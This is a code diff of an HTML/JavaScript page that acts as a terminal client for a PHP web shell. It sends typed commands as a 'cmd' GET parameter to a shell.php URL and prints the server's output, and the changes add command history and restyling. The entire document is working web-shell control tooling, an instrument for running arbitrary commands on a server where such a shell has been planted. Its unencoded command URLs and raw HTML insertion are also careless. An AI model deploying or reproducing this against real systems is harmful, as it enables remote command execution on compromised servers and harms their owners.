@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html>
 
 	<head>
@@ -9,75 +10,102 @@
 				background: #222;
 			}
 			#cmdb {
-				background: #444;
-				color: #00ff00;
+				background: #333;
+				color: #fff;
 				height: 95%;
 				width: 100%;
 				display: block;
-				float: left;
-				font-family: Consolas;
+				font-family: Courier;
 				font-weight: bold;
-			}
-			textarea {
-				background: transparent;
-				height: 0;
-				width: 0;
-				margin: 0px;
-				padding: 0px;
-				outline: none;
-				color: transparent;
-				border: transparent;
-				resize: none;
+				position: fixed;
+				overflow: scroll;
 			}
 			#shelloc {
 				padding: 3px;
 				width: 400px;
 				margin: 5px 0px;
 			}
+			.pmt {
+				color: yellow;
+			}
+			.ipb {
+				width: 80%;
+				color: yellow;
+				font-family: courier;
+				font-weight: bold;
+				font-size: 16px;
+				background: transparent;
+				border: none;
+				outline: none;
+			}
 		</style>
-		<!--script src="jq.js"></script-->
 		<script>
-			var tb, cmdb;
-			var keys = "1234567890~-_=+[{]}|;:\'\",<.>/?\\]!@#$%^&*()abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ 	";
+			var ipb, xprompt = "<span class='pmt'>phpshell-$ </span>";
+			var hist = [], curcmd=0;
 			window.onload = function() {
-				tb = document.getElementById("cmdta");
-				tb.focus();
 				cmdb = document.getElementById("cmdb");
-				tb.addEventListener('keydown', function (e){
-					if(e.key.toUpperCase() == "ENTER") {
-						makeGET(`${document.getElementById('shelloc').value}?cmd=${tb.value}`, showop);
-						tb.value = "";
-					}
-					else if(keys.includes(e.key)) {
-						cmdb.innerHTML += e.key;
-					}
-				}, false);
+				addipb();
 			}
 			function xfocus() {
-				tb.focus();
+				ipb.focus();
 			}
-			function showop(value) {
-				value = value.replace(/\n/g, "<br/>");
+			function addipb() {
+				cmdb.innerHTML += xprompt;
+				ipb = document.createElement("input");
+				ipb.type = "text";
+				ipb.className = "ipb";
+				cmdb.appendChild(ipb);
+				ipb.focus();
+				ipb.addEventListener('keydown', function (e) {
+					if(e.key.toUpperCase() == "ENTER") {
+						ipb.readonly = true;
+						makeGET(document.getElementById('shelloc').value, ipb.value, showop);
+					} else  if(e.key.toUpperCase() == "ESCAPE") {
+						cmdb.innerHTML = "";
+						addipb();
+					} else {
+						switch (e.key.toUpperCase()) {
+							case "ARROWUP":
+								if((curcmd-1)>-1) {
+									ipb.value = hist[--curcmd];
+								}
+								break;
+							case "ARROWDOWN":
+								if((curcmd+1) < hist.length) {
+									ipb.value = hist[++curcmd];
+								} else {
+									ipb.value = "";
+									curcmd = hist.length;
+								}
+								break;
+						}
+					}
+				});
+			}
+			function showop(cmd, value) {
 				value = value.replace(/\r/g, "");
-				cmdb.innerHTML += ("<br/>" + value);
+				cmdb.innerHTML += cmd + "<br/>";
+				cmdb.innerText += value;
+				addipb();
 			}
-			function makeGET(url, callback) {
-				/*$.ajax({ url: murl, success: function(data) { alert(data); } });*/
-				var request = new XMLHttpRequest();
-				request.onreadystatechange = function () {
-					callback(request.responseText);
+			function makeGET(url, cmd, callback) {
+				if(cmd != "") {
+					hist.push(cmd);
+					curcmd = hist.length;
+					var request = new XMLHttpRequest();
+					request.onreadystatechange = function () {
+						if (this.readyState == 4 && this.status == 200)
+							callback(cmd, request.responseText);
+					}
+					url += `?cmd=${cmd}`;
+					request.open("GET", url, true);
+					request.send();
 				}
-				request.open("GET", url, true);
-				request.send();
 			}
-
 		</script>
 	</head>
 	<body>
 		<center><input type="text" id="shelloc" value="http://localhost/shell.php" placeholder="http://localhost/shell.php" /></center>
-		<textarea id="cmdta"></textarea>
-		<div id="cmdb" onclick="xfocus()">
-			<!--input type="button" onclick="alert(document.getElementById('cmdta').value)" value="show"/-->
-		</div>
+		<div id="cmdb" onclick="xfocus()"></div>
 	</body>
 </html>
